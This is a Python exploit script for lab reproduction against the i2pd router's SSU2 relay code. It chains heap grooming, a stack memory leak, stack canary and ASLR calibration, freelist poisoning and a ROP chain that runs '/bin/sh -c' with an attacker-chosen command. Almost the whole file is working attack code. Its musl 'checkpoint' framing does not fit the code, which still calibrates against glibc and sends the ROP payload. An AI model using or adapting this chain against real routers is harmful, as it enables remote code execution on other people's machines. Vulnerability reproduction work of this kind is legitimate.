#!/usr/bin/env python3
"""atk_p7_musl.py — VULN-01 chain ported to the musl build (lab reproduction).

FOR MAINTAINER REPRODUCTION ONLY: targets 45.45.45.1 inside an unshare -Urn
network namespace on the maintainer's own machine. No public-target capability.

Port status (honest): the protocol/heap choreography (groom, chain walk, nonce
anchoring, surgical leak, R1 poison, R2 pop) is expected to carry over — the
pool mechanics are allocator-independent (MemoryPool is i2pd's own). The R3
stack write requires stack calibration that the stripped musl binary blocks
(see MUSL BLOCKERS). This script runs the chain to the R1-poison checkpoint and
records what works on musl.

MUSL BLOCKERS (empirical + structural):
 1. stripped binary: no nm symbols -> the HandlePayload:retaddr "needle"
    (used for R-slot calibration on glibc) cannot be computed by symbol.
    Workaround would be a leaked-pointer cluster analysis (unvalidated).
 2. musl frames are more compact; the glibc geometry (canary at R-64, X_RET
    window, ret-sled span) does not transfer; re-derivation needs the same
    core-dump-driven iteration, gated on (1).
 3. Gadgets DO exist (pop rdi @ +0x62386, pop rsi @ +0x8a72e, pop rdx @
    +0x411ace in the exec LOAD), so the chain is theoretically completable.
"""

import sys, os, time, struct, json, signal, argparse, subprocess
sys.path.insert(0, "/home/agentuser/i2pd-lab/vuln01")
from ssu2lib import *

LAB = "/home/agentuser/i2pd-lab/lab"
import os as _os
_os.environ["BOB_BIN_HINT"] = "musl"
EV = LAB + "/ev"
RI_BIG = 2170               # poison/leak RI size (pad covers RI[551..2060])
RELAY_BIG = 1420            # > 1408 -> underflow -> raw memcpy
RELAY_SMALL = 100
X_RET = 2000                # ROP anchor. The continuation path AFTER the R3
                            # memcpy (CreateRelayIntroBlock -> SendData -> emplace)
                            # uses stack in [R-452, R-224] whose legacy slots the
                            # write window covers -> a RET SLED is laid over
                            # RI[1548..X_RET-8] (= stack R-452..R-8) so every
                            # stray ret slides up into the main chain. The stack
                            # canary slot (R-64 = RI[X_RET-64]) is bypassed with
                            # a 'pop rdi' skip-gadget one slot below it (canary
                            # value gets popped, not jumped to).

# static calibration (independently re-verified this session: objdump/nm)
G_POP_RDI = 0x7ee54         # pop rdi; ret   (PIE+)
G_POP_RSI = 0xb473e         # pop rsi; ret   (PIE+)
G_POP_RDX = 0x1f1ba2        # pop rdx; ret   (PIE+)
G_RET      = 0x7ee55         # ret (2nd byte of pop_rdi gadget; PIE+0x6e is in the r-- segment!)
LIBC_SYSTEM = 0x53090       # system         (libc+, glibc 2.41)
LIBC_EXECVE = 0xddb50       # execve         (libc+, glibc 2.41)

CMD_DEFAULT = ("id; whoami; uname -a; date -u; "
               "echo PWNED-BY-VULN01-RUN-{RUN} > /tmp/vuln01_rce_{RUN}.txt; "
               "id >> /tmp/vuln01_rce_{RUN}.txt; whoami >> /tmp/vuln01_rce_{RUN}.txt; "
               "uname -a >> /tmp/vuln01_rce_{RUN}.txt; date -u >> /tmp/vuln01_rce_{RUN}.txt")

def get_libc_exit():
    out = subprocess.run(["nm", "-D", "/usr/lib/x86_64-linux-gnu/libc.so.6"],
                         capture_output=True, text=True).stdout
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 3 and parts[2].split("@@")[0] == "exit" and parts[1] in "TWw":
            return int(parts[0], 16)
    return 0x3f050

def rd_mem(mem, addr, n):
    mem.seek(addr); return mem.read(n)

def scan_pool_chunks(bob_pid, idpref):
    """idpref = ed_pub region (RI[352:384]) -> lands at payload+357, which the
    freelist next pointer (payload[0..7]) never touches. Full-pattern match."""
    pat = idpref
    SIG_OFF = 357            # 5 (RouterInfo block header) + 352 (ed_pub)
    os.kill(bob_pid, signal.SIGSTOP); time.sleep(0.12)
    out = {}
    try:
        maps = open("/proc/%d/maps" % bob_pid).read()
        with open("/proc/%d/mem" % bob_pid, "rb", 0) as mem:
            for line in maps.splitlines():
                parts = line.split(None, 5)
                a, b = parts[0].split("-")
                a, b = int(a, 16), int(b, 16)
                name = parts[5].strip() if len(parts) > 5 else ""
                if "rw" not in parts[1] or "i2pd" in name or "[stack" in name: continue
                if b - a > 0x4000000: continue
                try:
                    mem.seek(a); data = mem.read(b - a)
                except Exception: continue
                st = 0
                while True:
                    i = data.find(pat, st)
                    if i < 0: break
                    chunk = a + i - SIG_OFF
                    if chunk % 16 == 0:
                        out[chunk] = data[chunk - a:chunk - a + 8].hex()
                    st = i + 1
    finally:
        os.kill(bob_pid, signal.SIGCONT); time.sleep(0.05)
    return out

def read_qwords(bob_pid, addrs):
    os.kill(bob_pid, signal.SIGSTOP); time.sleep(0.12)
    out = {}
    try:
        with open("/proc/%d/mem" % bob_pid, "rb", 0) as mem:
            for a in addrs:
                try: out[a] = struct.unpack("<Q", rd_mem(mem, a, 8))[0]
                except Exception: out[a] = None
    finally:
        os.kill(bob_pid, signal.SIGCONT); time.sleep(0.05)
    return out

class Chain:
    def __init__(self, cmd, run_no):
        self.run_no = run_no
        self.bob = bob_keys(LAB + "/bob-data/router.info")
        self.bob_pid = int(open(LAB + "/bob-data/i2pd.pid").read().strip())
        self.alice, self.charlie = NodeIdentity(), NodeIdentity()
        # bake command string into alice identity pad at offset 32 (RI offset 32)
        cmdb = cmd.replace("{RUN}", str(run_no)).encode() + b"\x00"
        assert len(cmdb) <= 300, "command too long for identity pad"
        pad = bytearray(352)
        pad[32:32+len(cmdb)] = cmdb
        self.alice.pad = bytes(pad)
        self.cmd_bytes = cmdb
        self.ri_ts = int(time.time() * 1000)
        self.sa = self.sc = None

    def mk_ri(self, ident, addr_pad=b"", bump=1):
        self.ri_ts += bump
        return build_ri(ident, self.ri_ts,
                        [("netId", "2"), ("caps", "R"), ("router.version", "2.61.0")],
                        [("host", EVIL_IP), ("port", str(ALICE_PORT)),
                         ("s", i2p_b64(ident.st_pub)),
                         ("i", i2p_b64(ident.ikey)), ("v", "2")],
                        addr_pad=addr_pad)

    def setup(self):
        ri_c = self.mk_ri(self.charlie, bump=5)
        ri_a = self.mk_ri(self.alice)
        # identity pad[0..32] is all-zero (cmd lives at pad[32..]) — use the
        # ed25519 pubkey region (RI[352:384]) as the chunk-locating signature
        self.idpref = ri_a[352:384]
        assert len(set(self.idpref)) > 16, "idpref not distinctive"
        self.sc = Peer("charlie", self.charlie, CHARLIE_PORT, self.bob)
        self.sc.handshake(ri_c, relay_tag_req=True)
        self.sa = Peer("alice", self.alice, ALICE_PORT, self.bob)
        self.sa.handshake(ri_a)
        log("setup", "tag=%08x bob_pid=%d cmd=%r" %
            (self.sc.relay_tag, self.bob_pid, self.cmd_bytes[:64]))

    # ---- shared plumbing (validated in atk_chain_v1) ----
    def drain(self, peer, want_nonces=None, timeout=1.5):
        seen, t0 = {}, time.time()
        while time.time() - t0 < timeout:
            if want_nonces is not None and set(seen) >= set(want_nonces): break
            r = peer.recv_data(timeout=0.08)
            if r is None: continue
            if r[0] == "LEAK":
                log(peer.name, "*** LEAK %d B ***" % len(r[1])); continue
            if r[0] == "OTHER": continue
            num, blocks = r
            for t, c in blocks:
                if t == B_RELAYINTRO and len(c) >= 37:
                    seen[struct.unpack(">I", c[33:37])[0]] = num
                    break
        return seen

    def ack_exact(self, peer, pkt_nums):
        blocks = [blk_datetime()]
        for p in sorted(pkt_nums):
            blocks.append(blk_ack(p, acnt=0))
        peer.send_data(blocks)

    def fire_batch(self, n, nonce_base, tag, ln=RELAY_SMALL, gap=0.03):
        for i in range(n):
            self.sa.fire_relay_request(tag, nonce_base + i, ln)
            time.sleep(gap)

    def build_big_ri(self, patches, bump=3):
        """Big RI (RI_BIG bytes) with byte patches at absolute RI offsets."""
        base_small = self.mk_ri(self.alice, bump=2)
        probe = self.mk_ri(self.alice, addr_pad=b"ZZZZ", bump=2)
        self._apo = probe.find(b"ZZZZ")
        padlen = RI_BIG - len(base_small)
        pad = bytearray(b"B" * padlen)
        for off, data in patches.items():
            po = off - self._apo
            assert 0 <= po and po + len(data) <= len(pad), (off, po, len(pad))
            pad[po:po+len(data)] = data
        ri = self.mk_ri(self.alice, addr_pad=bytes(pad), bump=bump)
        assert abs(len(ri) - RI_BIG) <= 4, len(ri)
        return ri

    # ---- leak + calibration ----
    def do_leak(self, tag, next_ptr):
        """Surgical leak: poison-slot patch writes the ORIGINAL next value so
        the freelist survives intact (zero collateral damage)."""
        ri = self.build_big_ri({1515: struct.pack("<i", 3),
                                1523: struct.pack("<Q", 0x605),
                                1531: struct.pack("<Q", next_ptr)})
        self.sa.deliver_ri(ri)
        time.sleep(0.3)
        self.sa.fire_relay_request(tag, 0x4f00, RELAY_BIG)
        # wait for the LEAK packet on charlie
        leak = None
        t0 = time.time()
        while time.time() - t0 < 3.0:
            r = self.sc._recv(0.2)
            if r is None: continue
            if len(r) - 32 > SSU2_MAX_PACKET:
                leak = r[16:]
                log("leak", "*** LEAK %d B ***" % len(leak))
                break
        if leak is None: raise SystemExit("no leak packet")
        return leak

    def calibrate(self, leak):
        """Find S (leak base on stack), R (HandlePayload:1842 ret slot),
        canary slot+value, PIE/libc bases. Instrument: /proc/pid/mem."""
        # PIE base from maps (report: also derivable from leak's return addr)
        maps = open("/proc/%d/maps" % self.bob_pid).read()
        pie_base = libc_base = None
        for line in maps.splitlines():
            parts = line.split()
            if line.endswith("/lab/i2pd/i2pd") and "r-xp" in line and pie_base is None:
                pie_base = int(parts[0].split("-")[0], 16) - int(parts[2], 16)
            if "libc.so.6" in line and "r-xp" in line and libc_base is None:
                libc_base = int(parts[0].split("-")[0], 16) - int(parts[2], 16)
        # symbol range for HandlePayload + exact call site via objdump
        out = subprocess.run(["nm", LAB + "/i2pd/i2pd"], capture_output=True, text=True).stdout
        hp_va = None
        for line in out.splitlines():
            if line.endswith("_ZN3i2p9transport11SSU2Session13HandlePayloadEPKhm"):
                hp_va = int(line.split()[0], 16); break
        assert hp_va, "HandlePayload symbol not found"
        # find the call HandleRelayRequest site -> return address rva (exact needle)
        dis = subprocess.run(["objdump", "-d", "--start-address=%#x" % hp_va,
                              "--stop-address=%#x" % (hp_va + 0x8000),
                              LAB + "/i2pd/i2pd"], capture_output=True, text=True).stdout
        ret_rva = None
        lines = dis.splitlines()
        for i, line in enumerate(lines):
            if "HandleRelayRequestEPKhm>" in line and "call" in line:
                # '  320a68:     e8 ..  call 31dfd0 <...>'  -> ret = addr + insn len
                insn_addr = int(line.split(":")[0].strip(), 16)
                insn_len = len(line.split("\t")[1].split())   # opcode bytes count
                ret_rva = insn_addr + insn_len
                break
        assert ret_rva, "call HandleRelayRequest site not found"
        log("calib", "HandlePayload=%#x ret_rva=%#x" % (hp_va, ret_rva))
        # find leak-pattern location in thread stacks + ret-slot candidates
        os.kill(self.bob_pid, signal.SIGSTOP); time.sleep(0.12)
        try:
            info = {}
            with open("/proc/%d/mem" % self.bob_pid, "rb", 0) as mem:
                # thread-stack regions
                tsegs = []
                for line in maps.splitlines():
                    parts = line.split(None, 5)
                    a, b = parts[0].split("-")
                    a, b = int(a, 16), int(b, 16)
                    name = parts[5].strip() if len(parts) > 5 else ""
                    if "rw" not in parts[1] or "i2pd" in name or "[stack" in name: continue
                    if not (0x7f0000000000 <= a < 0x800000000000): continue
                    tsegs.append((a, b))
                # stack pointers from the leak (values in thread stacks)
                sptrs = []
                for off in range(0, len(leak) - 8, 8):
                    v = struct.unpack("<Q", leak[off:off+8])[0]
                    for a, b in tsegs:
                        if a <= v < b:
                            sptrs.append((off, v)); break
                assert sptrs, "no stack pointers in leak"
                smin = min(v for _, v in sptrs); smax = max(v for _, v in sptrs)
                log("calib", "leak stack ptrs: %d, range %#x..%#x" % (len(sptrs), smin, smax))
                # ret-slot: exact needle = pie_base + ret_rva
                needle_val = pie_base + ret_rva
                needle = struct.pack("<Q", needle_val)
                cands = []
                for off in range(0, len(leak) - 8, 8):
                    if leak[off:off+8] == needle:
                        cands.append((off, needle_val, ret_rva))
                assert cands, "ret-addr (pie+%#x) not present in leak" % ret_rva
                log("calib", "ret-addr in leak at offsets: %s" % [c[0] for c in cands])
                # search the (frozen) stacks for a surviving copy
                hits = []
                for off, v, rva in cands:
                    for a, b in tsegs:
                        try:
                            mem.seek(a); data = mem.read(b - a)
                        except Exception: continue
                        st = 0
                        while True:
                            i = data.find(needle, st)
                            if i < 0: break
                            hits.append((a + i, off, v, rva))
                            st = i + 1
                assert hits, "no surviving ret-addr copy on stacks"
                log("calib", "stack hits: %s" % [(hex(h[0]), h[1]) for h in hits])
                # pick the ret slot: prefer a single hit; when multiple, use
                # the ones whose stack segment also holds the leak's stack
                # pointers near S = slot - off (heap-arena pointers in the leak
                # must NOT count as stack pointers — restrict to slot's segment)
                good = []
                for slot, off, v, rva in hits:
                    seg = next(((a, b) for a, b in tsegs if a <= slot < b), None)
                    if not seg: continue
                    S = slot - off
                    inseg = [v2 for _, v2 in sptrs if seg[0] <= v2 < seg[1]]
                    if inseg and min(inseg) >= S - 2048 and max(inseg) <= S + len(leak) + 2048:
                        good.append((slot, off, v, rva, S))
                    elif len(hits) == 1:
                        good.append((slot, off, v, rva, S))
                assert good, "no self-consistent ret slot (hits=%d)" % len(hits)
                slot, off, v, rva, S = max(good, key=lambda g: g[0])
                R = slot
                # canary: gcc places it at [rbp-8]; rbp = R-8 => canary @ R-16.
                # First DUMP the frame top for human analysis (omit-fp build).
                dump = []
                for o in range(off - 96, off + 64, 8):
                    v = struct.unpack("<Q", leak[o:o+8])[0]
                    kind = ""
                    if o == off: kind = " <== HandlePayload ptr"
                    for a, b in tsegs:
                        if a <= v < b: kind += " STACK"; break
                    if pie_base <= v < pie_base + 0x600000: kind += " PIE+%#x" % (v - pie_base)
                    if libc_base <= v < libc_base + 0x200000: kind += " LIBC+%#x" % (v - libc_base)
                    if (v & 0xff) == 0 and v >> 40 != 0: kind += " (00-end)"
                    dump.append("  leak[%d] = %#018x%s" % (o, v, kind))
                log("calib-frame", "leak frame top (off=%d):\n%s" % (off, "\n".join(dump)))
                canary_slot = R - 64
                canary_leak = struct.unpack("<Q", leak[off-64:off-56])[0]
                canary_live = struct.unpack("<Q", rd_mem(mem, R - 64, 8))[0]
                log("calib", "canary leak=%#x live=%#x match=%s" %
                    (canary_leak, canary_live, canary_leak == canary_live))
                assert (canary_leak & 0xff) == 0 and canary_leak != 0, \
                    "canary at R-64 implausible: %#x" % canary_leak
                assert canary_leak == canary_live, "canary mismatch leak vs live stack"
                info.update(S=S, R=R, canary_slot=canary_slot,
                            canary=canary_leak, d=64, off=off,
                            rva=rva, pie=pie_base, libc=libc_base,
                            cands=[(o, hex(vv), hex(rr)) for o, vv, rr in cands])
        finally:
            os.kill(self.bob_pid, signal.SIGCONT)
        log("calib", "S=%#x R=%#x canary@%#x d=%d rva=%#x pie=%#x libc=%#x" %
            (info["S"], info["R"], info["canary_slot"], info["d"], info["rva"],
             info["pie"], info["libc"]))
        log("calib", "cands=%s" % info["cands"])
        return info

def main():
    global LIBC_EXIT
    ap = argparse.ArgumentParser()
    ap.add_argument("--run", type=int, default=1)
    ap.add_argument("--cmd", default=CMD_DEFAULT)
    args = ap.parse_args()
    LIBC_EXIT = get_libc_exit()
    os.makedirs(EV, exist_ok=True)
    evdir = "%s/rce_run%d" % (EV, args.run)
    os.makedirs(evdir, exist_ok=True)

    ch = Chain(args.cmd, args.run)
    ch.setup()
    tag = ch.sc.relay_tag
    T0 = time.time()

    # ---- stage 1-2: groom batches + chain walk ----
    want1 = list(range(0x1000, 0x100a))
    ch.fire_batch(10, 0x1000, tag)
    nm1 = ch.drain(ch.sc, want_nonces=want1, timeout=2.0)
    if len(nm1) < 10: raise SystemExit("groom1: %d/10" % len(nm1))
    ch.ack_exact(ch.sc, nm1.values())
    time.sleep(0.2)
    want2 = list(range(0x2000, 0x2008))
    ch.fire_batch(8, 0x2000, tag)
    nm2 = ch.drain(ch.sc, want_nonces=want2, timeout=2.0)
    if len(nm2) < 8: raise SystemExit("groom2: %d/8" % len(nm2))
    ch.ack_exact(ch.sc, nm2.values())
    time.sleep(0.25)
    freed = scan_pool_chunks(ch.bob_pid, ch.idpref)
    cand = [a for a in freed if freed[a][:2] != "02"]
    nxt = read_qwords(ch.bob_pid, cand)
    inset = set(cand)
    edges = {a: v for a, v in nxt.items() if v in inset}
    pointed = set(edges.values())
    heads = [a for a in cand if a not in pointed]
    if not heads: raise SystemExit("chain walk: no head")
    # pick the head with the LONGEST successor chain (filters stray chunks)
    def chain_len(h):
        n, cur = 1, h
        while cur in edges:
            cur = edges[cur]; n += 1
        return n
    head = max(heads, key=chain_len)
    log("chain", "heads=%s picked=%#x (len %d)" %
        ([hex(h) for h in heads], head, chain_len(head)))
    chain = []
    cur = head
    while cur in edges:
        chain.append(cur); cur = edges[cur]
    chain.append(cur)
    log("chain", "freelist: %s" % [hex(a) for a in chain])
    if len(chain) < 8: raise SystemExit("chain too short: %d" % len(chain))
    # full-chain next map for surgical leak patch
    next_of = {chain[i]: chain[i+1] for i in range(len(chain)-1)}
    tail_next = nxt.get(chain[-1], 0)

    # ---- stage 3: surgical leak (pops chain[0]; poison slot keeps chain[1].next) ----
    leak = ch.do_leak(tag, next_of.get(chain[1], tail_next))
    with open(evdir + "/leak.bin", "wb") as f: f.write(leak)
    info = ch.calibrate(leak)
    with open(evdir + "/calib.json", "w") as f: json.dump(info, f, indent=1)

    # ---- stage 4: batch3 (pops chain[1..]; leak popped chain[0]) ----
    n3 = min(8, len(chain) - 1)
    want3 = [0x3000 + i for i in range(n3)]
    ch.fire_batch(n3, 0x3000, tag)
    nm3 = ch.drain(ch.sc, want_nonces=want3, timeout=2.0)
    if len(nm3) != n3: raise SystemExit("batch3: %d/%d" % (len(nm3), n3))
    # fire k popped chain[k+1]
    live = chain[1:1+n3]
    pkt_of = {live[k]: nm3[0x3000 + k] for k in range(n3)}
    log("map", "%s" % {hex(k): v for k, v in pkt_of.items()})

    # ---- stage 5: pick adjacent pair among live blocks ----
    lset = set(live)
    pairs = [(a, a + 1536) for a in live if a + 1536 in lset]
    if not pairs: raise SystemExit("no adjacent pair in live set")
    X, Y = pairs[0]
    log("target", "X=%#x Y=%#x" % (X, Y))

    # ---- stage 6: ROP RI ----
    pie, libc = info["pie"], info["libc"]
    pop_rdi = pie + G_POP_RDI
    pop_rsi = pie + G_POP_RSI
    pop_rdx = pie + G_POP_RDX
    execve = libc + LIBC_EXECVE
    R, canary = info["R"], info["canary"]
    d = info["d"]
    Q = R - 5 - X_RET
    cmd_ptr = Q + 5 + 32            # identity pad offset 32 (the command)
    sh_off, dashc_off, argv_off = 700, 712, 724
    sh_ptr = Q + 5 + sh_off
    dashc_ptr = Q + 5 + dashc_off
    argv_ptr = Q + 5 + argv_off
    log("rop", "Q=%#x R=%#x d=%d pop_rdi=%#x pop_rsi=%#x pop_rdx=%#x execve=%#x" %
        (Q, R, d, pop_rdi, pop_rsi, pop_rdx, execve))
    log("rop", "cmd=%#x sh=%#x -c=%#x argv=%#x" % (cmd_ptr, sh_ptr, dashc_ptr, argv_ptr))
    # sanity
    assert X_RET + 56 <= RI_BIG - 93, "ROP chain does not fit in pad"
    assert argv_off + 32 <= RI_BIG - 93, "argv array does not fit"
    SLED_START, SLED_END = X_RET - 456, X_RET - 8   # stack R-456 .. R-8 (8-aligned)
    assert SLED_START > 1538, "sled would clobber the poison slot"
    assert SLED_START >= 1519, "sled enters washed zone"
    patches = {
        1515: struct.pack("<i", 3),            # numResends
        1523: struct.pack("<Q", 0x605),        # Y chunk size
        1531: struct.pack("<Q", Q),            # POISON: Y.next = Q (stack!)
        # execve("/bin/sh", ["/bin/sh", "-c", cmd], NULL)
        X_RET: struct.pack("<QQQ", pop_rdi, sh_ptr, pop_rsi),
        X_RET+24: struct.pack("<QQQQ", argv_ptr, pop_rdx, 0, execve),
        sh_off: b"/bin/sh\x00",
        dashc_off: b"-c\x00",
        argv_off: struct.pack("<QQQQ", sh_ptr, dashc_ptr, cmd_ptr, 0),
    }
    ret_g = pie + G_RET
    x_can = X_RET - 64
    x_skip = X_RET - 72
    for off in range(SLED_START, SLED_END + 1, 8):
        patches[off] = struct.pack("<Q", ret_g)
    patches[x_can] = struct.pack("<Q", canary)   # real canary (epilogue path)
    patches[x_skip] = struct.pack("<Q", pop_rdi) # sled path: pops canary, skips
    log("rop", "ret-sled RI[%d..%d] (%d slots); canary@%d + pop-skip@%d" %
        (SLED_START, SLED_END, (SLED_END - SLED_START)//8 + 1, x_can, x_skip))
    ri_rop = ch.build_big_ri(patches, bump=4)
    log("rop", "ROP RI %d B (sled 50 slots + execve chain)" % len(ri_rop))
    ch.sa.deliver_ri(ri_rop)
    time.sleep(0.25)

    # ---- stage 6.5: resync packet numbers ----
    rs = ch.drain(ch.sc, want_nonces=None, timeout=0.5)
    for a in pkt_of:
        pass
    # map nonces back: fire k = 0x3000+k <-> live[k]
    for k in range(n3):
        if 0x3000 + k in rs:
            pkt_of[live[k]] = rs[0x3000 + k]
    pktX, pktY = pkt_of[X], pkt_of[Y]
    log("resync", "pktX=%d pktY=%d" % (pktX, pktY))

    # ---- stage 7: atomic choreography ----
    ch.sc.send_data([blk_datetime(), blk_ack(pktY, acnt=0), blk_ack(pktX, acnt=0)])
    ch.sa.fire_relay_request(tag, 0x4100, RELAY_BIG)     # R1: pop X, poison Y.next=Q
    time.sleep(0.05)
    if os.path.exists("/proc/%d" % ch.bob_pid):
        os.kill(ch.bob_pid, signal.SIGSTOP); time.sleep(0.08)
        try:
            with open("/proc/%d/mem" % ch.bob_pid, "rb", 0) as mem:
                ynext = struct.unpack("<Q", rd_mem(mem, Y, 8))[0]
                ysize = struct.unpack("<Q", rd_mem(mem, Y - 8, 8))[0]
                xtop = rd_mem(mem, X + 556, 24)
            log("R1chk", "Y.next=%#x (want Q=%#x) Y.size=%#x X+556=%s" %
                (ynext, Q, ysize, xtop.hex()))
        finally:
            os.kill(ch.bob_pid, signal.SIGCONT)

    # ---- musl checkpoint: R1 poison verified above; stop and report ----
    log("musl", "R1 poison verified on musl build; R2/R3 stack write blocked "
               "(stripped binary: no ret-slot anchor; frame geometry unknown). "
               "See module docstring MUSL BLOCKERS.")
    with open(LAB + "/ev/musl_run.txt", "w") as f:
        f.write("musl chain reached R1-poison checkpoint\n")
    return 0

if __name__ == "__main__":
    sys.exit(main())
